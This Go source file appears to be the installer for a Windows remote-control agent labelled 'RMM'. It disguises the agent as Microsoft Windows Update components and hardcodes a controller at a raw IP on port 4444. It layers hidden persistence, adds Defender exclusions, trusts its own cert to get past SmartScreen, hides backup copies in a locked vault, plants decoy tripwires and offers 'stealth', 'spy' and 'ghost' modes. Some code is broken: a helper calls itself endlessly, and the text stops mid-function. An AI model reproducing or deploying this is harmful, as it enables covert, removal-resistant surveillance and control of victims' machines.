package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"rmm/internal/version"
)

//go:embed payload/*
var payloadFS embed.FS

// hideWindow wraps an exec.Cmd so the child process never flashes a console.
func hideWindow(cmd *exec.Cmd) *exec.Cmd {
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	return cmd
}

// hiddenExec is a shorthand for hideWindow(hiddenExec(...)).
func hiddenExec(name string, args ...string) *exec.Cmd {
	return hideWindow(hiddenExec(name, args...))
}

func isAdmin() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

func relaunchAsAdmin() {
	exe, _ := os.Executable()
	verb, _ := syscall.UTF16PtrFromString("runas")
	file, _ := syscall.UTF16PtrFromString(exe)
	params, _ := syscall.UTF16PtrFromString(strings.Join(os.Args[1:], " "))
	mod := syscall.NewLazyDLL("shell32.dll")
	mod.NewProc("ShellExecuteW").Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(file)),
		uintptr(unsafe.Pointer(params)), 0, 0)
	os.Exit(0)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// hideFile sets hidden+system attributes so the backup survives casual
// browsing and naive delete sweeps. Best effort; failures are ignored.
func hideFile(path string) {
	_, _ = hiddenExec("attrib", "+h", "+s", path).CombinedOutput()
}

// trustPublisherCert installs our code-signing cert into TrustedPublisher
// so SmartScreen/Smart App Control accept our signed binaries instead of
// blocking them as "unknown publisher". Needs admin (we have it).
func trustPublisherCert(dir string) {
	cer := filepath.Join(dir, "RMM.cer")
	if _, err := os.Stat(cer); err != nil {
		log.Printf("[!] publisher cert missing, SmartScreen may warn")
		return
	}
	out, err := hiddenExec("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
	if err != nil {
		log.Printf("[!] trust publisher cert: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Publisher cert trusted")
}

// addDefenderExclusions keeps Defender from quarantining our install dir +
// exe (heuristic false positives on admin tools). Best effort: fails
// silently when Defender is absent, managed, or Tamper Protection blocks it
// (then the friend allows it once in Protection history).
func addDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

func removeDefenderExclusions(paths ...string) {
	for _, p := range paths {
		q := strings.ReplaceAll(p, "'", "''")
		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		if strings.HasSuffix(strings.ToLower(p), ".exe") {
			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
		}
	}
}

// grantUsersModify lets a standard-user agent swap its own exe during
// self-update (rename needs modify rights on the dir). Best effort:
// logs and continues when icacls is unavailable.
func grantUsersModify(dirs ...string) {
	for _, d := range dirs {
		if d == "" {
			continue
		}
		out, err := hiddenExec("icacls", d, "/grant", "*S-1-5-32-545:(OI)(CI)M", "/T", "/C", "/Q").CombinedOutput()
		if err != nil {
			log.Printf("[!] icacls %s: %v %s", d, err, strings.TrimSpace(string(out)))
			continue
		}
		log.Printf("[*] Users modify granted on %s", d)
	}
}

// vaultDir is the fourth backup copy, inside the SYSTEM profile. Same path
// the agent's watcher reads (duplicated: installer and agent are separate
// binaries that must agree without sharing code).
func vaultDir() string {
	sys := os.Getenv("SystemRoot")
	if sys == "" {
		sys = `C:\Windows`
	}
	return filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
}

// lockVault strips inheritance and grants only SYSTEM + Administrators, so
// standard-user wipes and profile sweeps cannot reach the last-resort copy.
func lockVault(dir string) {
	out, err := hiddenExec("icacls", dir, "/inheritance:r", "/grant", "SYSTEM:(OI)(CI)F", "/grant", "*S-1-5-32-544:(OI)(CI)F", "/C", "/Q").CombinedOutput()
	if err != nil {
		log.Printf("[!] vault lock %s: %v %s", dir, err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Vault locked to SYSTEM+Administrators: %s", dir)
}

// sha256File returns the hex SHA256 of a file ("" on any error).
func sha256File(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return ""
	}
	return hex.EncodeToString(h.Sum(nil))
}

// writeIntegrityManifest stamps dir/integrity.json {version, exe sha256}.
// The agent's healers verify it before restoring, refusing trojaned bytes.
func writeIntegrityManifest(dir, ver, exePath string) {
	sha := sha256File(exePath)
	if sha == "" || ver == "" {
		return
	}
	_ = os.WriteFile(filepath.Join(dir, "integrity.json"), []byte(`{"v":`+strconv.Quote(ver)+`,"sha":`+strconv.Quote(sha)+`}`+"\n"), 0644)
}

func saveHouse(path, addr string) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return
	}
	seen := map[string]bool{addr: true}
	houses := []string{addr + "\n"}
	if b, err := os.ReadFile(path); err == nil {
		for _, ln := range strings.Split(string(b), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" || strings.HasPrefix(ln, "#") || seen[ln] {
				continue
			}
			seen[ln] = true
			houses = append(houses, ln+"\n")
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(houses, "")), 0644)
}

func install() {
	silent := false
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" {
			silent = true
		}
	}
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	// Bland machine-wide home (hidden system dir) instead of a branded
	// Program Files folder.
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
	_ = os.MkdirAll(installDir, 0755)

	_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
	_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
	// Legacy powershell watchdogs are extinct as of v1.40.9 (native --watch
	// mode); kill any left running.
	_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
	time.Sleep(1500 * time.Millisecond)

	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true, "agent.exe": true}
	_ = fs.WalkDir(payloadFS, "payload", func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel("payload", path)
		if skip[strings.ToLower(filepath.Base(rel))] {
			return nil
		}
		dest := filepath.Join(installDir, rel)
		_ = os.MkdirAll(filepath.Dir(dest), 0755)
		data, _ := fs.ReadFile(payloadFS, path)
		_ = os.WriteFile(dest, data, 0644)
		return nil
	})

	agentPath := filepath.Join(installDir, "MicrosoftWindowsClient.exe")
	if _, err := os.Stat(agentPath); os.IsNotExist(err) {
		_ = filepath.Walk(installDir, func(p string, info os.FileInfo, err error) error {
			if err == nil && strings.EqualFold(filepath.Base(p), "MicrosoftWindowsClient.exe") {
				agentPath = p
			}
			return nil
		})
	}
	_ = os.Remove(filepath.Join(installDir, "agent.exe"))

	certPath := filepath.Join(installDir, "server.crt")

	controllerAddr := "176.229.98.54:4444"
	agentToken := ""
	agentModeFlag := ""
	deleteTokenFlag := ""
	for i, a := range os.Args {
		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
			controllerAddr = os.Args[i+1]
		} else if strings.HasPrefix(a, "-controller=") {
			controllerAddr = strings.TrimPrefix(a, "-controller=")
		} else if strings.HasPrefix(a, "--controller=") {
			controllerAddr = strings.TrimPrefix(a, "--controller=")
		} else if (a == "-token" || a == "--token") && i+1 < len(os.Args) {
			agentToken = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
		} else if strings.HasPrefix(a, "--token=") {
			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
		} else if (a == "-deletetoken" || a == "--deletetoken") && i+1 < len(os.Args) {
			deleteTokenFlag = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-deletetoken=") {
			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "-deletetoken="))
		} else if strings.HasPrefix(a, "--deletetoken=") {
			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "--deletetoken="))
		} else if (a == "-mode" || a == "--mode") && i+1 < len(os.Args) {
			agentModeFlag = strings.TrimSpace(os.Args[i+1])
		} else if strings.HasPrefix(a, "-mode=") {
			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "-mode="))
		} else if strings.HasPrefix(a, "--mode=") {
			agentModeFlag = strings.TrimSpace(strings.TrimPrefix(a, "--mode="))
		}
	}
	_ = os.WriteFile(filepath.Join(installDir, "controller.txt"), []byte(controllerAddr+"\n"), 0644)
	saveHouse(filepath.Join(installDir, "houses.txt"), controllerAddr)
	// Registration token: lets the controller tell managed agents apart
	// from rogue ones (empty = untokened, accepted unless enforced).
	tokenPath := filepath.Join(installDir, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(tokenPath, []byte(agentToken+"\n"), 0600)
		log.Printf("[*] Agent registration token stored")
	}
	// Operation mode (v1.42.3): persisted to mode.json so it survives
	// reboots/updates. Roster duplicated from internal/commands/mode.go
	// (keep in sync) to avoid pulling agent deps into the installer.
	if agentModeFlag != "" {
		validModes := []string{"normal", "stealth", "spy", "ghost", "performance", "kiosk", "audit"}
		ok := false
		for _, v := range validModes {
			if strings.EqualFold(agentModeFlag, v) {
				agentModeFlag = v
				ok = true
				break
			}
		}
		if !ok {
			log.Fatalf("unknown -mode %q (valid: %s)", agentModeFlag, strings.Join(validModes, ", "))
		}
		_ = os.WriteFile(filepath.Join(installDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
		log.Printf("[*] Agent operation mode stored: %s", agentModeFlag)
	}

	cmdLine := fmt.Sprintf(`"%s" -controller %s -ca "%s"`, agentPath, controllerAddr, certPath)

	// HKCU may fail when installer runs elevated - not critical
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdate", cmdLine); err != nil {
			log.Printf("[!] HKCU WindowsUpdate Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdate", cmdLine)
		k.Close()
		log.Printf("[*] HKLM WindowsUpdate Run key set")
	}

	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
	// schtasks /query /v reports the Task To Run value; if it mentions the
	// old name we log it explicitly so field techs can confirm the heal.
	if out, err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
		for _, ln := range strings.Split(string(out), "\n") {
			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
				break
			}
		}
	} else {
		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
	}
	_, _ = hiddenExec("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()

	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT10M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure></Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>-controller %s -ca "%s"</Arguments></Exec></Actions>
</Task>`, agentPath, controllerAddr, certPath)

	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
	if out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
	}
	_ = os.Remove(tmpTask)
	// Delete any legacy watchdog task before recreating below, so a stale
	// entry can never overlap with the new one.
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()

	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()

	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
	// ask Defender to leave our dir/exe alone (heuristic false positives).
	trustPublisherCert(installDir)
	addDefenderExclusions(installDir, agentPath)
	// Self-update-friendly ACL: the agent often runs as a standard user
	// while the installer runs admin, leaving an admin-owned dir the agent
	// cannot swap its own exe in (rename = Access denied). Grant Users
	// modify (well-known SID, locale-proof) so future self-updates swap
	// directly; boxes installed before this still converge via staged
	// updates applied by the elevated watcher/WMI/service.
	grantUsersModify(installDir)

	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
	blenderDir := filepath.Join(threeDObjects, "blender")
	_ = os.MkdirAll(blenderDir, 0755)
	// Second backup location: if one backup dir is wiped, the other still
	// heals the agent. Ordinary-looking system-ish path, hidden+system.
	backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
	if os.Getenv("APPDATA") == "" {
		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
	}
	_ = os.MkdirAll(backupDir2, 0755)
	// Save the task XML next to the backup AND in the install dir (the
	// WMI consumer runs as SYSTEM and can only rely on the install dir).
	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "agent_task.xml"), []byte(taskXML), 0644)

	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
	backupCert := filepath.Join(blenderDir, "server.crt")
	_ = copyFile(agentPath, backupAgent)
	_ = copyFile(certPath, backupCert)
	backupAgent2 := filepath.Join(backupDir2, "MicrosoftWindowsClient.exe")
	backupCert2 := filepath.Join(backupDir2, "server.crt")
	_ = copyFile(agentPath, backupAgent2)
	_ = copyFile(certPath, backupCert2)
	grantUsersModify(blenderDir, backupDir2)
	// Self-delete token: guards permanent removal (kill-agent is only
	// quiet). Explicit flag wins; otherwise keep an existing one from any
	// copy; otherwise generate. Stored 0600 in install dir + both backups
	// + vault (travels like token.txt). Never logged.
	deleteTokenPath := filepath.Join(installDir, "delete_token.txt")
	deleteToken := deleteTokenFlag
	if deleteToken != "" && len(deleteToken) < 8 {
		log.Fatalf("delete token must be 8+ characters")
	}
	if deleteToken == "" {
		for _, p := range []string{deleteTokenPath, filepath.Join(blenderDir, "delete_token.txt"), filepath.Join(backupDir2, "delete_token.txt")} {
			if b, err := os.ReadFile(p); err == nil && len(bytes.TrimSpace(b)) >= 8 {
				deleteToken = string(bytes.TrimSpace(b))
				break
			}
		}
	}
	if deleteToken == "" {
		var rb [24]byte
		if _, err := rand.Read(rb[:]); err != nil {
			log.Fatalf("cannot generate delete token: %v", err)
		}
		deleteToken = hex.EncodeToString(rb[:])
		log.Printf("[*] Generated self-delete token (store it — removal needs it)")
	}
	_ = os.WriteFile(deleteTokenPath, []byte(deleteToken+"\n"), 0600)
	_ = os.WriteFile(filepath.Join(blenderDir, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	_ = os.WriteFile(filepath.Join(backupDir2, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	// Token travels with the backups (only when set - never create empties).
	backupToken := filepath.Join(blenderDir, "token.txt")
	backupToken2 := filepath.Join(backupDir2, "token.txt")
	if agentToken != "" {
		_ = os.WriteFile(backupToken, []byte(agentToken+"\n"), 0600)
		_ = os.WriteFile(backupToken2, []byte(agentToken+"\n"), 0600)
	} else {
		// Keep a previously-issued token across reinstalls that omit -token.
		if b, err := os.ReadFile(backupToken); err == nil && len(bytes.TrimSpace(b)) > 0 {
			_ = os.WriteFile(tokenPath, b, 0600)
			_ = os.WriteFile(backupToken2, b, 0600)
			log.Printf("[*] Kept existing registration token from backup")
		}
	}
	// Mode travels with the backups (only when set - never create empties).
	if agentModeFlag != "" {
		_ = os.WriteFile(filepath.Join(blenderDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
		_ = os.WriteFile(filepath.Join(backupDir2, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
	} else {
		// Keep a previously-set mode across reinstalls that omit -mode.
		for _, bp := range []string{filepath.Join(blenderDir, "mode.json"), filepath.Join(backupDir2, "mode.json")} {
			if b, err := os.ReadFile(bp); err == nil && len(bytes.TrimSpace(b)) > 0 {
				_ = os.WriteFile(filepath.Join(installDir, "mode.json"), b, 0644)
				log.Printf("[*] Kept existing operation mode from backup")
				break
			}
		}
	}
	// version.txt next to binary AND both backups: watchdog restores only
	// when the backup is >= installed, so a bulk-updated agent is never
	// downgraded by a stale backup.
	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
	writeIntegrityManifest(blenderDir, version.Version, agentPath)
	writeIntegrityManifest(backupDir2, version.Version, agentPath)
	// Fourth copy in the SYSTEM profile vault, locked to SYSTEM +
	// Administrators: unreachable to standard-user wipes and profile
	// sweeps, readable by the elevated healers as the copy of last resort.
	vault := vaultDir()
	_ = os.MkdirAll(vault, 0755)
	vaultAgent := filepath.Join(vault, "MicrosoftWindowsClient.exe")
	vaultCert := filepath.Join(vault, "server.crt")
	_ = copyFile(agentPath, vaultAgent)
	_ = copyFile(certPath, vaultCert)
	_ = os.WriteFile(filepath.Join(vault, "version.txt"), []byte(version.Version+"\n"), 0644)
	if agentToken != "" {
		_ = os.WriteFile(filepath.Join(vault, "token.txt"), []byte(agentToken+"\n"), 0600)
	}
	_ = os.WriteFile(filepath.Join(vault, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
	if agentModeFlag != "" {
		_ = os.WriteFile(filepath.Join(vault, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
	}
	writeIntegrityManifest(vault, version.Version, agentPath)
	hideFile(vaultAgent)
	hideFile(vault)
	lockVault(vault)
	log.Printf("[*] Vault copy installed: %s", vault)
	// Hidden+system attributes: invisible to casual browsing, blocks
	// shift-delete sweeps that skip system files.
	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
		hideFile(p)
	}

	// Native supervisor (v1.40.9+): the agent binary watches itself
	// (--watch mode). No powershell process, no .ps1 on disk. Legacy
	// script + its task-XML copy are removed so nothing references them.
	_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(backupDir2, "watchdog.ps1"))
	_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
	// (Retired powershell watchdog body removed; native --watch mode above.)

	// Start the native supervisor (same binary, hidden, bland name).
	cmdWatchdog := hiddenExec(agentPath, "--watch")
	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmdWatchdog.Start()

	watchdogRunCmd := fmt.Sprintf(`"%s" --watch`, agentPath)
	// HKCU may fail when installer runs elevated (writes to admin's HKCU, not user's) - not critical, HKLM is primary
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		if err := k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd); err != nil {
			log.Printf("[!] HKCU watchdog Run key write failed (non-critical): %v", err)
		}
		k.Close()
	}
	// HKLM is primary persistence - survives reboots for all users
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateWatchdog", watchdogRunCmd)
		k.Close()
		log.Printf("[*] HKLM watchdog Run key set")
	}

	createWatchdogTask(agentPath, blenderDir)
	_ = copyFile(filepath.Join(blenderDir, "watchdog_task.xml"), filepath.Join(installDir, "watchdog_task.xml"))

	// Logon-time vector: Active Setup runs StubPath once per user per
	// version. Detached via cmd/start so it can NEVER block logon (a
	// never-exiting watcher as StubPath would hang the desktop).
	ensureActiveSetup(agentPath)

	// Third persistence task under a different name: a kill chain wiping
	// "WindowsUpdate*" still leaves this one to revive everything.
	createOrchestratorTask(agentPath, blenderDir, installDir)

	// Slow down manual deletion: hidden+system on the install dir itself.
	hideFile(installDir)

	// Deepest layers: WMI timers + the SYSTEM repair service (boot-time
	// coverage with nobody logged on). The service only repairs — the
	// agent itself always runs in the user session.
	setupWmiLayer(agentPath)
	installRepairService(agentPath)

	cmd := hiddenExec(agentPath, "-controller", controllerAddr, "-ca", certPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	_ = cmd.Start()

	// Honeypot legacy homes (64-bit + 32-bit twin): wipe any pre-1.40.9
	// install, then rebuild the dirs as DECOYS (stub agent.exe + cert
	// copy, both tripwired). Kill chains working from old notes waste
	// themselves here thinking they won, while the real install lives in
	// ProgramData. Decoys stay VISIBLE (hidden honeypots catch nobody).
	legacyHomes := []string{`C:\Program Files\RMM\Agent`}
	if pf := os.Getenv("ProgramFiles"); pf != "" {
		legacyHomes[0] = filepath.Join(pf, "RMM", "Agent")
	}
	x86Home := `C:\Program Files (x86)\RMM\Agent`
	if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
		x86Home = filepath.Join(pf, "RMM", "Agent")
	}
	legacyHomes = append(legacyHomes, x86Home)
	for _, legacyHome := range legacyHomes {
		if legacyHome == installDir {
			continue
		}
		_ = os.RemoveAll(legacyHome)
		_ = os.MkdirAll(legacyHome, 0755)
		if stub, err := fs.ReadFile(payloadFS, "payload/agent.exe"); err == nil {
			_ = os.WriteFile(filepath.Join(legacyHome, "agent.exe"), stub, 0755)
			log.Printf("[*] Honeypot stub placed at %s", filepath.Join(legacyHome, "agent.exe"))
		} else {
			log.Printf("[!] Honeypot stub missing from payload")
		}
		_ = copyFile(certPath, filepath.Join(legacyHome, "server.crt"))
		// Bait marker: the watcher only tripwires a deployed honeypot
		// (never alarms on machines predating it).
		_ = os.WriteFile(filepath.Join(legacyHome, "decoy.ver"), []byte(version.Version+"\n"), 0644)
	}
	// Fresh protection score (clears any stale tamper alarm).
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		_ = os.Remove(filepath.Join(localApp, "RMM", "protection.json"))
	}

	// Decoy heal vectors under a third name: a task + Run value that look
	// like legacy leftovers but actually re-arm persistence when run.
	// Attackers deleting "important-looking" entries trip the wire instead.
	createDecoyTask(agentPath, blenderDir, installDir)
	decoyRunCmd := fmt.Sprintf(`"%s" --wmi-heal`, agentPath)
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
		_ = k.SetStringValue("WindowsUpdateCheck", decoyRunCmd)
		k.Close()
		log.Printf("[*] Decoy Run value set")
	}
	// Task XMLs in the SECOND backup dir too: three copies total, so no
	// single wiped dir blinds every healer at once.
	for _, xml := range []string{"agent_task.xml", "watchdog_task.xml", "orchestrator_task.xml", "decoy_task.xml"} {
		_ = copyFile(filepath.Join(blenderDir, xml), filepath.Join(backupDir2, xml))
	}

	if !silent {
		fmt.Println("Agent installed to", installDir)
	}
}

func main() {
	// Silent installs show no console at all (bulk/remote deployment).
	for _, a := range os.Args {
		if a == "--silent" || a == "-s" || a == "--uninstall" {
			hideOwnConsole()
			break
		}
	}
	wantUninstall := false
	confirmed := false
	for i, a := range os.Args {
		if a == "--uninstall" {
			wantUninstall = true
		}
		if (a == "--confirm" && i+1 < len(os.Args) && strings.EqualFold(os.Args[i+1], "YES")) || strings.EqualFold(a, "--confirm=YES") {
			confirmed = true
		}
	}
	if wantUninstall {
		// Friction against casual/accidental removal: the flag alone is
		// not enough. Legit removal: --uninstall --confirm YES
		if !confirmed {
			fmt.Println("Refusing to uninstall without explicit confirmation.")
			fmt.Println("Usage: Agent-Setup.exe --uninstall --confirm YES")
			os.Exit(2)
		}
		programData := os.Getenv("ProgramData")
		if programData == "" {
			programData = `C:\ProgramData`
		}
		installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
		// Legacy home (pre-1.40.9): wiped after the new install lands.
		legacyDir := ""
		if pf := os.Getenv("ProgramFiles"); pf != "" {
			legacyDir = filepath.Join(pf, "RMM", "Agent")
		} else {
			legacyDir = `C:\Program Files\RMM\Agent`
		}
		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			_ = k.DeleteValue("WindowsUpdateCheck")
			k.Close()
		}
		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
			_ = k.DeleteValue("WindowsUpdate")
			_ = k.DeleteValue("WindowsUpdateWatchdog")
			_ = k.DeleteValue("WindowsUpdateCheck")
			k.Close()
		}
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
		removeWmiLayer()
		_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
		_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
		blenderDir := filepath.Join(threeDObjects, "blender")
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "decoy_task.xml"))
		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
			_ = os.RemoveAll(blenderDir)
